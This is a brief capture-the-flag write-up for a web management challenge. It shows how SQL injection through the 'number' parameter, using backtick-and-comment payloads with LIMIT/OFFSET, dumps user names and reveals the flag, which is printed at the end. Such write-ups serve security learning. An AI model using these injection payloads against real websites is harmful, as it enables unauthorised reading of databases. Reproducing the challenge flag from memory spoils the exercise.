# Writeup
```
I've created a new website so you can do all your important management. It includes users, creating things, reading things, and... well, not much else. Maybe there's a flag?

Second instance running at 52.90.229.46:8558

    tpctf{san1t1z3_y0ur_1npu7s} is not the correct flag. Look harder ;)

    Note: the flag format is flag{}, not the usual tpctf{}

    Author: Kevin Higgs

```
# Solve
This is a normal query: ```SELECT `1` FROM users WHERE name = 'custom-kevin';```

There are three parameters: `number`, `value` and `action`

We will inject into `number` parameter and try to display name of users

payload: ```name` FROM users LIMIT 1 OFFSET 0-- -```
and we get `custom-Hi`, let try another
payload: ```name` FROM users LIMIT 1 OFFSET 1-- -``` and we got the flag

# Flag
flag{aLW4ys_ESC4PE_3v3rYTH1NG!!!!!}
